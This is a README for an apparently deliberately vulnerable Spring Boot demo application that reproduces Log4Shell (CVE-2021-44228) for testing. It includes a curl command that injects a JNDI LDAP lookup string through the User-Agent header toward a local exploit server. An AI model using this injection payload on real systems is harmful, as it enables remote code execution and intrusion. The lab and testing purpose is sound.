# Original Repo: https://github.com/korteke/log4shell-demo

## Simple Spring Boot application which is vulnerable to Log4Shell (CVE-2021-44228)
* Changed default logging framework from logback to log4j2

## Environment Setup

* All components of the sub project *l4sexploit* must be up and running (see README.md)

## Usage 

Application logs 'User-Agent' header, so one can test vulnerability with curl and `ExploitServer` in *l4sexploit*:
```
curl -A '${jndi:ldap://localhost:1389/a}' http://localhost:9090/
```
